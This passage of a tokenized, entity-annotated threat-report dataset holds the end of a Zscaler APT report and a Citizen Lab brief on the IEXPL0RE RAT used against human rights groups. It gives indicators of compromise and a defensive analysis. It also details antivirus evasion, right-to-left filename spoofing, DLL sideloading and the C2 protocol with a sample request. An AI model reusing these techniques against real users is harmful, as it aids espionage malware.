["Chinese", "origin", "of", "attacks"], ["\u2022", "VPS/hosting", "servers", "used", "match", "some", "of", "those", "previously", "used", "in"], ["alleged", "APT", "attacks", "."], ["The", "sum", "of", "these", "indicators", "has", "led", "to", "our", "conclusion", "that", "this", "was"], ["\u201c"], ["The", "sum", "of", "these"], ["indicators", "has", "led", "to"], ["our", "conclusion", "that"], ["this", "was", "an", "attack"], ["performed", "over", "a"], ["significant", "period", "of"], ["time", "that", "focused", "on", "a"], ["specific", "target", ",", "given"], ["the", "sensitive", "nature", "of"], ["their", "work", "."], ["\u201c"], ["\u2022", "The", "RAT", "payload", "in", "question", "is", "popular", "among", "previously", "documented"], ["-Zscaler", "ThreatLabZ"], ["an", "attack", "performed", "over", "a", "significant", "period", "of", "time", "that", "focused", "on"], ["a", "specific", "target", ",", "given", "the", "sensitive", "nature", "of", "their", "work", ".", "Based", "on"], ["information", "in", "the", "public", "domain", ",", "it", "appears", "that", "these", "attacks", "correlate"], ["with", "others", ",", "previously", "identified", "as", "being", "the", "work", "of", "the", "\u201c1", ".", "php\u201d"], ["Group", ".", "Identified", "targets", "of", "these", "attacks", "include", "China/US", "relations"], ["experts", ",", "USG", "/", "DIB", "entities", ",", "and", "the", "Geospatial", "industry", ".", "Based", "on"], ["the", "targets", ",", "it", "is", "our", "belief", "that", "corporate", "espionage", "was", "the", "goal", "of"], ["the", "attacks", ".", "Open-source", "reports", "suggest", "that", "these", "attacks", "are", "more"], ["widespread", "than", "many", "realize", "and", "that", "the", "same", "or", "similar", "actors"], ["are", "compromising", "numerous", "organizations", "in", "order", "to", "steal", "sensitive"], ["intellectual", "property", ".", "As", "stated", "within", "the", "Lessons", "Learned", "section", ",", "it"], ["is", "important", "that", "those", "concerned", "about", "such", "attacks", "be", "vigilant", "in", "their"], ["log", "collection", "and", "analysis", "to", "identify", "anomalies", "or", "other", "indications", "of"], ["compromise", "."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "17"], ["Alleged", "APT", "Intrusion", "Set:", "\u201c1", ".", "php\u201d", "Group"], ["About", "Zscaler:", "The", "Cloud", "Security", "Company\u2122"], ["Zscaler", "enforces", "business", "policy", ",", "mitigates", "risk", "and", "provides", "twice"], ["the", "functionality", "at", "a", "fraction", "of", "the", "cost", "of", "current", "solutions", ",", "utilizing"], ["a", "multi-tenant", ",", "globally-deployed", "infrastructure", ".", "Zscaler\u2019s", "integrated", ","], ["cloud-delivered", "security", "services", "include", "Web", "Security", ",", "Mobile", "Security", ","], ["Email", "Security", "and", "DLP", ".", "Zscaler", "services", "enable", "organizations", "to", "provide"], ["the", "right", "access", "to", "the", "right", "users", ",", "from", "any", "place", "and", "on", "any", "device\u2014all"], ["while", "empowering", "the", "end-user", "with", "a", "rich", "Internet", "experience", "."], ["About", "Zscaler", "ThreatLabZ\u2122"], ["ThreatLabZ", "is", "the", "global", "security", "research", "team", "for", "Zscaler", ".", "Leveraging"], ["an", "aggregate", "view", "of", "billions", "of", "daily", "web", "transaction", ",", "from", "millions", "of"], ["users", "across", "the", "globe", ",", "ThreatLabZ", "identifies", "new", "and", "emerging", "threats"], ["as", "they", "occur", ",", "and", "deploys", "protections", "across", "the", "Zscaler", "Security", "Cloud"], ["in", "real", "time", "to", "protect", "customers", "from", "advanced", "threats", "."], ["For", "more", "information", ",", "visit", "www", ".", "zscaler.com."], ["\u00a9", "2011", "Zscaler", ".", "All", "Rights", "Reserved", "."], ["Page", "18"]]}], [{"vertexSet": [{"old_id": "T1", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 4, "pos": [4, 5]}, {"old_id": "T2", "type": "Time", "name": "2011", "sent_id": 8, "pos": [4]}, {"old_id": "T3", "type": "Time", "name": "2010", "sent_id": 8, "pos": [10]}, {"old_id": "T4", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 8, "pos": [19, 20]}, {"old_id": "T5", "type": "TrojanHorse", "name": "Sharky RAT", "sent_id": 9, "pos": []}, {"old_id": "T6", "type": "TrojanHorse", "name": "c0d0so0", "sent_id": 10, "pos": [12]}, {"old_id": "T7", "type": "TrojanHorse", "name": "BackdoorBriba", "sent_id": 10, "pos": []}, {"old_id": "T8", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 24, "pos": [21, 22]}, {"old_id": "T9", "type": "Software", "name": "StrokeIt", "sent_id": 56, "pos": [0]}, {"old_id": "T10", "type": "TrojanHorse", "name": "IEXPL0REEXE", "sent_id": 69, "pos": []}, {"old_id": "T11", "type": "Malware", "name": "perf*dat", "sent_id": 71, "pos": []}, {"old_id": "T12", "type": "Malware", "name": "ContainerV2", "sent_id": 72, "pos": []}, {"old_id": "T13", "type": "Malware", "name": "client", "sent_id": 73, "pos": [25]}, {"old_id": "T14", "type": "TrojanHorse", "name": "csvexe", "sent_id": 82, "pos": []}, {"old_id": "T15", "type": "Malware", "name": "360trayexe", "sent_id": 83, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "svchostexe", "sent_id": 84, "pos": []}, {"old_id": "T17", "type": "Malware", "name": "ContainerV2", "sent_id": 85, "pos": [1]}, {"old_id": "T18", "type": "Malware", "name": "client", "sent_id": 86, "pos": [1]}, {"old_id": "T19", "type": "MD5", "name": "d7c826ac94522416a0aecf5b7a5d2afe", "sent_id": 108, "pos": [2]}, {"old_id": "T20", "type": "MD5", "name": "66e1aff355c29c6f39b21aedbbed2d5c", "sent_id": 109, "pos": [2]}, {"old_id": "T21", "type": "MD5", "name": "21a1ee58e4b543d7f2fa3b4022506029", "sent_id": 110, "pos": [2]}, {"old_id": "T22", "type": "MD5", "name": "8d4e42982060d884e2b7bd257727fd7c", "sent_id": 111, "pos": [2]}, {"old_id": "T23", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 102, "pos": [6]}, {"old_id": "T24", "type": "Malware", "name": "CONTAINERV2", "sent_id": 112, "pos": []}, {"old_id": "T25", "type": "MD5", "name": "d46d85777062afbcda02de68c063b877", "sent_id": 115, "pos": [2]}, {"old_id": "T26", "type": "MD5", "name": "85e8c6ddcfa7e289be14324abbb7378d", "sent_id": 116, "pos": [2]}, {"old_id": "T27", "type": "Malware", "name": "CLIENT", "sent_id": 117, "pos": [2]}, {"old_id": "T28", "type": "MD5", "name": "eb51b384fcbbe468a6877f569021c5d1", "sent_id": 120, "pos": [4]}, {"old_id": "T29", "type": "MD5", "name": "8268297c1b38832c03f1c671e0a54a78", "sent_id": 121, "pos": [4]}, {"old_id": "T30", "type": "Time", "name": "November 1 2011", "sent_id": 120, "pos": []}, {"old_id": "T31", "type": "Time", "name": "November 29 2011", "sent_id": 121, "pos": []}, {"old_id": "T32", "type": "File", "name": "C:\\Documents and Settings\\user\\Local Settings\\Temp\\31Atmp", "sent_id": 128, "pos": []}, {"old_id": "T33", "type": "File", "name": "C:\\Documents and Settings\\user\\Local Settings\\Temp\\perf6cd2e5e9dat", "sent_id": 129, "pos": []}, {"old_id": "T34", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 123, "pos": [11]}, {"old_id": "T35", "type": "File", "name": "C:\\WINDOWS\\system\\lockdat", "sent_id": 131, "pos": []}, {"old_id": "T36", "type": "File", "name": "C:\\WINDOWS\\system\\MSMAPI32SRG", "sent_id": 132, "pos": []}, {"old_id": "T37", "type": "File", "name": "C:\\WINDOWS\\system32\\STREAMSYS", "sent_id": 133, "pos": []}, {"old_id": "T38", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 134, "pos": [3]}, {"old_id": "T39", "type": "Country", "name": "China", "sent_id": 140, "pos": [6]}, {"old_id": "T40", "type": "TrojanHorse", "name": "IEXPL0RE", "sent_id": 138, "pos": [3]}, {"old_id": "T41", "type": "Obfuscation", "name": "0xCD", "sent_id": 149, "pos": [15]}, {"old_id": "T42", "type": "Indicator", "name": "updatemicrosoftcom", "sent_id": 166, "pos": []}, {"old_id": "T43", "type": "Malware", "name": "ContainerV2", "sent_id": 168, "pos": [3]}, {"old_id": "T44", "type": "CourseOfAction", "name": "network intrusion detection system", "sent_id": 219, "pos": [1, 4]}, {"old_id": "T45", "type": "TrojanHorse", "name": "IEXPL0RE RAT", "sent_id": 216, "pos": [5, 6]}], "labels": [{"old_id": "R1", "r": "P33", "h": 3, "t": 1, "evidence": [8]}, {"old_id": "R2", "r": "P33", "h": 3, "t": 2, "evidence": [8]}, {"old_id": "R3", "r": "P21", "h": 21, "t": 22, "evidence": []}, {"old_id": "R4", "r": "P21", "h": 20, "t": 22, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 19, "t": 22, "evidence": []}, {"old_id": "R6", "r": "P21", "h": 18, "t": 22, "evidence": []}, {"old_id": "R7", "r": "P21", "h": 24, "t": 23, "evidence": []}, {"old_id": "R8", "r": "P21", "h": 25, "t": 23, "evidence": []}, {"old_id": "R9", "r": "P21", "h": 27, "t": 26, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 28, "t": 26, "evidence": []}, {"old_id": "R11", "r": "P33", "h": 26, "t": 29, "evidence": [117, 118, 119, 120]}, {"old_id": "R12", "r": "P33", "h": 26, "t": 30, "evidence": [117, 118, 119, 120, 121]}, {"old_id": "R13", "r": "P21", "h": 31, "t": 33, "evidence": []}, {"old_id": "R14", "r": "P21", "h": 32, "t": 33, "evidence": []}, {"old_id": "R15", "r": "P21", "h": 34, "t": 37, "evidence": [131, 132, 133, 134]}, {"old_id": "R16", "r": "P21", "h": 35, "t": 37, "evidence": [132, 133, 134]}, {"old_id": "R17", "r": "P21", "h": 36, "t": 37, "evidence": [133, 134]}, {"old_id": "R18", "r": "P32", "h": 39, "t": 38, "evidence": [138, 139, 140]}, {"old_id": "R19", "r": "P21", "h": 41, "t": 42, "evidence": [166, 167, 168]}, {"old_id": "R20", "r": "P34", "h": 43, "t": 44, "evidence": []}], "title": ["inputs/txt/201209CitizenLabIEXPL0RERAT"], "sents": [["CITIZEN", "LAB", "TECHNICAL", "BRIEF"], ["001"], ["IEXPL0RE", "RAT"], ["BY", "SETH", "HARDY", "|", "AUGUST", "2012"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["1"], ["INTRODUCTION"], ["This", "report", "describes", "a", "remote", "access", "trojan", "(RAT)", "that", "three", "human", "rights-related", "organizations", "taking", "part", "in", "a", "Citizen", "Lab", "study", "on", "targeted", "cyber", "threats", "against", "human", "rights", "groups"], ["received", "via", "email", "in", "2011", "and", "at", "the", "end", "of", "2010", ".", "Here", "we", "refer", "to", "it", "as", "the", "IEXPL0RE", "RAT", ","], ["after", "the", "name", "of", "the", "launcher", "program", ".", "It", "was", "first", "called", "\u201cSharky", "RAT\u201d", "in", "Seth", "Hardy\u2019s", "talk", "at"], ["SecTor", "2011", ".", "Since", "then", "it", "has", "also", "been", "referred", "to", "as", "c0d0so0", "and", "possibly", "Backdoor", ".", "Briba."], ["A", "RAT", "is", "a", "program", "that", "allows", "a", "remote", "user", "full", "access", "to", "a", "computer", ".", "This", "type", "of", "program"], ["can", "be", "used", "for", "legitimate", "reasons", ".", "In", "these", "cases", ",", "RAT", "can", "also", "stand", "for", "remote", "administration"], ["tool", ".", "In", "the", "case", "of", "the", "IEXPL0RE", "RAT", ",", "the", "remote", "user", "has", "the", "ability", "to", "record", "user", "keystrokes"], ["(including", "passwords)", ",", "copy", "and", "delete", "files", ",", "download", "and", "run", "new", "programs", ",", "and", "even", "use", "the"], ["computer\u2019s", "microphone", "and", "camera", "to", "listen", "to", "and", "watch", "the", "user", "in", "real-time", "."], ["RATs", "are", "common", "in", "targeted", "malware", "attacks", "against", "human", "rights", "organizations", "and", "other"], ["NGOs", ".", "Targeted", "attacks", "with", "this", "sort", "of", "payload", "are", "often", "referred", "to", "as", "advanced", "persistent"], ["threats", "(APTs)", ".", "APTs", "differ", "from", "other", "traditional", "computer", "attacks", "in", "that", "they", "are", "designed", "to"], ["be", "quiet", "and", "collect", "data", "over", "time", ",", "and", "act", "as", "a", "starting", "point", "for", "future", "tracking", "and", "compromise", "of", "targets", ".", "It", "is", "not", "uncommon", "for", "an", "APT", "infection", "to", "persist", "for", "months", "or", "even", "years", "after"], ["the", "malicious", "program", "is", "first", "run", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["2"], ["ATTACK", "VECTOR"], ["Attempted", "delivery", "of", "the", "malware", "was", "via", "email", "attachment", ",", "employing", "social", "engineering", "techniques", ".", "The", "emails", "that", "contained", "the", "attached", "IEXPL0RE", "RAT", "were", "different", "every", "time", ",", "with"], ["a", "unique", "email", "and", "delivery", "method", "used", "for", "each", "attempt", ",", "including", "multiple", "versions", "targeted"], ["at", "the", "same", "organization", ".", "Each", "email", "was", "tailored", "specifically", "for", "the", "target", ",", "both", "in", "terms", "of"], ["subject", ",", "content", ",", "and", "the", "way", "the", "RAT", "was", "attached", "and", "hidden", "."], ["Organization", "1:", "a", "human", "rights", "NGO", "received", "multiple", "emails", "with", "interesting", "keywords", "from"], ["senders", "claiming", "to", "be", "from", "personal", "friends", ".", "These", "emails", "included", "an", "executable", "attachment"], ["in", "a", "password-protected", "archive", ",", "which", "helps", "prevent", "detection", "by", "antivirus", "software", ".", "The", "password", "was", "included", "in", "the", "email", "address", "."], ["Organization", "2:", "a", "news", "organization", "operating", "a", "website", "that", "reports", "on", "developments", "in", "China", ","], ["received", "an", "email", "containing", "a", "story", "about", "a", "high-rise", "apartment", "building", "fire", ".", "Attached", "to", "the"], ["email", "were", "four", "images", "and", "two", "executable", "files", "(", ".", "scr", "extensions)", "designed", "to", "look", "like", "images"], ["using", "the", "Unicode", "right-to-left", "override", "character", ".", "When", "each", "executable", "file", "is", "run", ",", "it", "will", "install"], ["and", "launch", "the", "malware", ",", "drop", "an", "image", ",", "open", "the", "image", ",", "and", "delete", "itself", ".", "The", "end", "result", "is", "that"], ["only", "an", "image", "is", "left", ",", "making", "the", "email", "look", "more", "legitimate", "if", "the", "malware", "is", "run", "(figure", "1)", "."], ["FIGURE", "1:"], ["IMAGE", "OF", "A", "HIGH-RISE", "FIRE", "USED", "TO", "TRICK", "RECIPIENTS", "INTO", "RUNNING", "THE", "MALWARE", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["3"], ["Organization", "3:", "a", "Tibet-related", "organization", "received", "two", "emails", "with", "different", "versions", "of", "the"], ["malware", "attached", ".", "The", "first", "file", "was", "an", "executable", "file", "designed", "to", "appear", "as", "a", "video", "of", "a", "speech"], ["by", "the", "Dalai", "Lama", ",", "attached", "to", "an", "email", "about", "a", "year", "review", "of", "Tibetan", "human", "rights", "issues"], ["(figure", "2)", ".", "The", "second", "file", "was", "embedded", "in", "an", "Excel", "spreadsheet", "attached", "to", "an", "email", "pretending", "to", "be", "from", "a", "conference", "on", "climate", "change", "."], ["Emails", "that", "contain", "malicious", "attachments", "use", "a", "variety", "of", "social", "engineering", "techniques", "to"], ["appear", "more", "legitimate", ".", "Methods", "include", "using", "names", "of", "real", "people", "and", "organizations", ",", "choosing"], ["material", "that", "is", "directly", "related", "to", "the", "target\u2019s", "interests", ",", "and", "including", "chains", "of", "fake", "forwards", "to"], ["make", "it", "appear", "as", "if", "the", "email", "has", "been", "circulated", "."], ["Including", "the", "attachments", "in", "a", "RAR", "file", "makes", "them", "less", "likely", "to", "be", "discovered", "by", "an", "antivirus"], ["(AV)", "scanner", ".", "Putting", "a", "password", "on", "the", "archive", "and", "including", "it", "in", "the", "email", "reduces", "the", "chances", "of", "AV", "discovery", "even", "further", "."], ["FIGURE", "2:", "EXAMPLE", "TARGETED", "EMAIL", "WITH", "IEXPL0RE", "RAT", "USING", "SOCIAL", "ENGINEERING", "METHODS", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["4"], ["A", "newer", "version", "of", "the", "RAT", "payload", "was", "later", "distributed", "via", "email", "in", "multiple", "RTF", "documents"], ["to", "organization", "3", ".", "The", "RTF", "dropped", "a", "DLL", "alongside", "a", "legitimate", "program", "vulnerable", "to", "DLL", "injection", ",", "allowing", "the", "program", "to", "run", "without", "a", "warning", "that", "the", "program", "is", "not", "digitally", "signed", "."], ["StrokeIt", ",", "a", "program", "for", "using", "mouse", "gestures", ",", "uses", "a", "file", "named", "config", ".", "dll", "without", "verifying", "the"], ["authenticity", "of", "the", "file", ".", "By", "replacing", "config", ".", "dll", "with", "the", "RAT", "downloader", ",", "the", "malicious", "code", "is"], ["run", "while", "appearing", "more", "legitimate", "to", "the", "operating", "system", "(figure", "3)", "."], ["FIGURE", "3:"], ["VALID", "DIGITAL", "SIGNATURE", "FOR", "THE", "STROKEIT", "PROGRAM", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["5"], ["MALWARE"], ["The", "IEXPL0RE", "RAT", "is", "delivered", "inside", "an", "executable", "program", "or", "document", ",", "which", "is", "customgenerated", "for", "each", "email", ".", "When", "a", "user", "opens", "the", "document", "or", "runs", "the", "program", ",", "it", "installs", "a"], ["launcher", "program", "on", "the", "computer", ".", "Antivirus", "programs", "frequently", "fail", "to", "detect", "the", "launcher"], ["program", "as", "malicious", ",", "as", "it", "is", "custom", "built", "for", "each", "specific", "target:", "the", "file", "contains", "a", "configuration", "file", "unique", "to", "the", "target", ",", "which", "is", "different", "each", "time", "it", "is", "sent", "out", ".", "This", "method", "is", "used", "to"], ["defeat", "signature-based", "antivirus", "programs", ",", "which", "only", "scan", "for", "files", "that", "are", "known", "to", "be", "malicious", ".", "As", "the", "launcher", "program", "is", "newly", "generated", "every", "time", ",", "it", "will", "never", "end", "up", "on", "a", "signature", "list", "until", "after", "it", "is", "already", "been", "used", "."], ["Once", "installed", "on", "a", "system", ",", "the", "launcher", "program", "goes", "through", "multiple", "programs", "to", "unpack", "a"], ["contained", "file", "(the", "actual", "RAT)", "before", "it", "can", "run", ".", "The", "IEXPL0RE", ".", "EXE", "(or", "other", "launcher)", "program", "contains", "multiple", "programs", ",", "layered", "like", "an", "onion", ",", "which", "eventually", "unpack", "a", "DLL", "(dynamic", "link", "library", ",", "another", "form", "of", "executable", "file)", ".", "The", "file", "name", "varies", ",", "but", "starts", "with", "\u201cperf\u201d"], ["and", "has", "an", "extension", "of", "", ".", "dat,", "and", "is", "saved", "to", "the", "%temp%", "folder", "(often", "C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp)", "."], ["Once", "the", "perf*", ".", "dat", "file", "is", "saved", "to", "disk", ",", "it", "runs", "(via", "injection", "into", "svchost", ".", "exe,", "a", "Windows", "program)", "and"], ["extracts", "another", "DLL", "into", "memory", ".", "This", "program", "is", "called", "\u201cContainerV2", ",", "\u201d", "as", "it", "is", "referenced", "from", "within"], ["the", "program", ",", "although", "it", "is", "never", "written", "to", "the", "disk", ".", "ContainerV2", "connects", "to", "the", "Internet", "and", "downloads", "another", "DLL", "called", "\u201cclient\u201d", ".", "The", "client", "is", "also", "kept", "in", "memory", "and", "never", "written", "to", "the", "disk", ".", "Once"], ["downloaded", ",", "ContainerV2", "will", "run", "the", "client", ",", "which", "does", "all", "of", "the", "IEXPL0RE", "RAT", "work", "(figure", "4)", "."], ["FIGURE", "4:", "STRUCTURE", "OF", "THE", "RAT", "LAUNCHER", "PROGRAM", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["6"], ["For", "Organization", "1", ",", "the", "executable", "launch", "process", "looks", "like", "this:"], ["\u2022\u2022"], ["", ".", "exe(attached", "file", ",", "launcher):", "appears", "as", "a", "text", "document;", "when", "run", ",", "displays", "a", "fake", "error"], ["message", "saying", "the", "file", "can\u2019t", "be", "found", "(figure", "5)"], ["\u2022\u2022", "csv", ".", "exe", "(runs", "and", "exits", "quickly)"], ["\u2022\u2022", "360tray", ".", "exe", "(runs", "and", "exits", "quickly)"], ["\u2022\u2022", "svchost", ".", "exe", "(with", "injected", "perf*", ".", "dat", "code)"], ["\u2022\u2022", "ContainerV2", "(injected", "into", "svchost", ".", "exe)"], ["\u2022\u2022", "client", "(downloaded", "and", "run", "in", "memory)"], ["FIGURE", "5:"], ["SOCIAL", "ENGINEERING", "TECHNIQUE:", "A", "FAKE", "ERROR", "MESSAGE", "HIDING", "THE", "FACT", "THAT", "THIS", "IS", "A", "PROGRAM", "."], ["One", "advantage", "of", "downloading", "the", "final", "stage", "is", "that", "if", "the", "attacker", "wanted", "to", "update", "the", "RAT"], ["software", "(to", "add", "new", "functionality", "for", "example)", ",", "it", "can", "be", "done", "very", "easily", ".", "Because", "code", "is", "downloaded", "every", "time", "the", "malware", "starts", ",", "if", "the", "code", "is", "changed", "on", "the", "server", "side", ",", "existing", "compromised", "machines", "will", "automatically", "update", "themselves", "the", "next", "time", "they", "are", "restarted", ".", "Over", "the"], ["time", "spent", "analyzing", "this", "malware", ",", "the", "client", "program", "did", "have", "minor", "changes", ",", "possibly", "bug", "fixes", "."], ["MD5", "hashes", ",", "also", "called", "message", "digests", ",", "are", "often", "used", "to", "identify", "a", "file", "based", "on", "its", "content", "."], ["A", "hash", "is", "a", "string", "of", "hexadecimal", "characters", "that", "identifies", "a", "file", ".", "Should", "the", "file", "change", "in", "any"], ["way", ",", "the", "hash", "will", "as", "well", ".", "Hashes", "are", "designed", "to", "be", "easy", "to", "compute", "from", "a", "full", "file", ",", "but", "it", "is"], ["very", "difficult", "to", "find", "two", "files", "with", "the", "same", "hash", "."], ["Use", "of", "hashes", "in", "the", "context", "of", "the", "IEXPL0RE", "RAT", "is", "difficult", ",", "as", "the", "downloaded", "client", "may"], ["change", ",", "and", "the", "ContainerV2", "program", "is", "different", "for", "every", "target", ".", "One", "of", "the", "main", "differences"], ["that", "guarantees", "that", "the", "hash", "will", "always", "be", "unique", "is", "that", "the", "configuration", "file", "for", "the", "RAT"], ["(including", "which", "command", "and", "control", "servers", "to", "connect", "to)", "is", "included", "in", "the", "program", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["7"], ["For", "reference", "some", "MD5", "hashes", "of", "IEXPL0RE", "components", "include:"], ["ORIGINAL", "ATTACHMENT:"], ["\u2022"], ["\u2022"], ["\u2022"], ["\u2022"], ["Organization", "1:", "d7c826ac94522416a0aecf5b7a5d2afe", "(EXE)"], ["Organization", "2:", "66e1aff355c29c6f39b21aedbbed2d5c", "(SCR)"], ["Organization", "3:", "21a1ee58e4b543d7f2fa3b4022506029", "(EXE)"], ["Organization", "3:", "8d4e42982060d884e2b7bd257727fd7c", "(XLS)"], ["CONTAINERV2:"], ["\u2022"], ["\u2022"], ["Organization", "1:", "d46d85777062afbcda02de68c063b877"], ["Organization", "2:", "85e8c6ddcfa7e289be14324abbb7378d"], ["ORGANIZATION", "2", "CLIENT", "(ONLY", "ACTIVE", "COMMAND", "AND", "CONTROL", "SERVER):"], ["\u2022"], ["\u2022"], ["November", "1", ",", "2011:", "eb51b384fcbbe468a6877f569021c5d1"], ["November", "29", ",", "2011:", "8268297c1b38832c03f1c671e0a54a78", "(current", "as", "of", "July", "20", ",", "2012)"], ["INFECTION"], ["Once", "the", "launcher", "program", "is", "run", ",", "it", "will", "install", "the", "IEXPL0RE", "binary", "and", "a", "startup", "link", "in", "the"], ["Start", "Menu:"], ["C:\\Documents", "and", "Settings\\All", "Users\\Start", "Menu\\Programs\\Startup\\IEXPL0RE", ".", "LNK"], ["C:\\Documents", "and", "Settings\\user\\Application", "Data\\Microsoft\\Internet", "Explorer\\IEXPL0RE", ".", "EXE"], ["It", "also", "leaves", "traces", "of", "the", "extracted", "binary", "and", "the", "link", "file", "(the", "", ".", "tmp", "file", "below)", "in", "%temp%:"], ["C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp\\31A", ".", "tmp"], ["C:\\Documents", "and", "Settings\\user\\Local", "Settings\\Temp\\perf6cd2e5e9", ".", "dat"], ["The", "RAT", "also", "uses", "a", "few", "files", "for", "configuration", "and", "recording", "keystrokes:"], ["C:\\WINDOWS\\system\\lock", ".", "dat"], ["C:\\WINDOWS\\system\\MSMAPI32", ".", "SRG"], ["C:\\WINDOWS\\system32\\STREAM", ".", "SYS"], ["When", "run", ",", "IEXPL0RE", "will", "connect", "to", "a", "command", "and", "control", "(C2)", "server", "for", "updates", ",", "sending", "keylogger", "data", ",", "and", "asking", "for", "RAT", "commands", ".", "The", "C2", "server", "is", "specified", "in", "a", "configuration", "file", "built"], ["into", "the", "RAT", "program", ".", "Each", "RAT", "instance", "is", "likely", "built", "using", "a", "packaging", "program", ".", "The", "configuration", "file", "allows", "for", "a", "primary", "server", "and", "an", "alternate", ",", "and", "may", "use", "either", "a", "domain", "or", "IP", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["8"], ["Each", "of", "the", "IEXPL0RE", "samples", "analyzed", "uses", "a", "different", "set", "of", "C2", "servers", ".", "One", "sample", "uses", "two"], ["domains", "that", "point", "to", "the", "same", "IP", ".", "The", "IP", "changes", "every", "few", "days", "to", "few", "weeks", ",", "but", "remains"], ["in", "one", "network", "block", "located", "in", "China", ".", "Other", "samples", "use", "either", "a", "single", "domain", "name", "and", "no"], ["backup", ",", "or", "a", "fixed", "IP", "with", "a", "localhost", "address", "as", "backup", ".", "The", "localhost", "address", "is", "a", "way", "to", "find"], ["and", "use", "a", "proxy", ",", "for", "example", ",", "if", "a", "computer", "is", "using", "a", "circumvention", "system", "such", "as", "Tor", ".", "Of", "the"], ["two", "samples", "using", "fixed", "IPs", ",", "both", "were", "sent", "to", "the", "same", "organization", ",", "and", "one", "appears", "to", "be", "a"], ["replacement", "for", "the", "other", ".", "Both", "C2", "servers", "are", "currently", "down", "."], ["C2", "COMMUNICATION"], ["IEXPL0RE", "has", "two", "different", "methods", "of", "communication:", "HTTP", "POST", "and", "GET", ".", "It", "also", "has", "the"], ["ability", "to", "use", "a", "HTTP", "CONNECT", "proxy", ".", "POST", "is", "the", "preferred", "method", "of", "communication;", "if", "it"], ["does", "not", "work", ",", "it", "will", "also", "attempt", "a", "GET", "connection", "."], ["All", "communication", "from", "the", "client", "to", "the", "server", "is", "encrypted", "with", "a", "one-byte", "XOR", "key", "0xCD", "."], ["(Information", "in", "this", "report", "shows", "the", "data", "after", "decryption", ".", ")", "POST", "commands", "put", "the", "data", "in"], ["the", "request", "body", ",", "while", "GET", "commands", "put", "the", "data", "in", "URL", "parameters", ".", "Server", "responses", "are"], ["all", "200", "OK", "messages", "with", "data", "in", "the", "body", "."], ["The", "system", "keeps", "track", "of", "the", "communication", "using", "a", "sequence", "number", ",", "which", "is", "part", "of", "the"], ["requested", "URL", ".", "The", "sequence", "number", "is", "nine", "digits", "long", ",", "starts", "at", "000000001", ",", "and", "generally"], ["increments", "by", "one", "for", "each", "packet", "sent", ".", "When", "authenticated", ",", "the", "sequence", "number", "jumps", "to"], ["000001000;", "if", "disconnected", ",", "the", "sequence", "number", "returns", "to", "the", "next", "sub-1000", "number", "expected", "."], ["THE", "HEADERS", "OF", "THE", "REQUEST", "LOOK", "LIKE", "THIS:"], ["POST", "/index000000001", ".", "asp", "HTTP/1", ".", "1"], ["Accept-Language:", "en-us"], ["User-Agent:", "Mozilla/4", ".", "0", "(compatible;", "MSIE", "7", ".", "0;", "Windows", "NT", "5", ".", "1;)"], ["Host:", "update", ".", "microsoft.com"], ["Connection:", "Keep-Alive"], ["Content-Type:", "text/html"], ["Content-Length:", "000041"], ["The", "Accept-Language", ",", "User-Agent", ",", "Connection", ",", "and", "Content-Type", "headers", "are", "always", "fixed", ".", "The"], ["Host", "header", "is", "also", "always", "fixed", "as", "update", ".", "microsoft.com;", "any", "requests", "to", "the", "C2", "server", "made"], ["without", "this", "header", "in", "place", "will", "be", "rejected", ",", "often", "with", "a", "redirect", "to", "Microsoft\u2019s", "website", "."], ["When", "run", ",", "ContainerV2", "communicates", "with", "the", "C2", "server", ",", "first", "establishing", "a", "socket", "by", "a", "three-way"], ["handshake", ".", "Below", ",", "the", "text", "at", "the", "start", "of", "the", "arrow", "indicates", "the", "packet", "type", ",", "sequence", "number", ",", "and"], ["connection", "socket", ".", "For", "example", ",", "\u201cPOST", "2", "(1)\u201d", "means", "that", "it", "is", "using", "an", "HTTP", "POST", "request", ",", "sequence"], ["number", "2", ",", "on", "the", "first", "established", "connection", "(figure", ".", "6)", ".", "The", "text", "on", "the", "line", "is", "the", "data", "in", "the", "packet"], ["after", "decryption", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["FIGURE", "6:"], ["9"], ["FIRST", "C2", "CONNECTION"], ["Once", "the", "first", "connection", "has", "been", "established", ",", "a", "second", "connection", "is", "made", "using", "a", "similar"], ["handshake", "(figure", "7)", "."], ["FIGURE", "7:"], ["SECOND", "C2", "CONNECTION"], ["When", "the", "second", "connection", "has", "been", "established", ",", "the", "ContainerV2", "program", "uses", "it", "to", "download"], ["the", "client", "and", "run", "it", "(figure", "8)", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["10"], ["FIGURE", "8:", "BINARY", "DOWNLOAD"], ["Once", "control", "has", "been", "handed", "off", "to", "the", "client", ",", "one", "connection", "is", "used", "for", "sending", "keylogger", "data", "from"], ["the", "client", "to", "the", "server", ",", "and", "the", "other", "connection", "is", "used", "to", "request", "RAT", "commands", "from", "the", "server", "."], ["With", "the", "protocol", "reversed", "(see", "Appendix", "B", "for", "a", "full", "listing", "of", "commands)", ",", "it", "was", "straightforward", "to", "write", "a", "program", "that", "communicates", "with", "the", "C2", "server", ",", "downloads", "the", "client", ",", "and", "sends"], 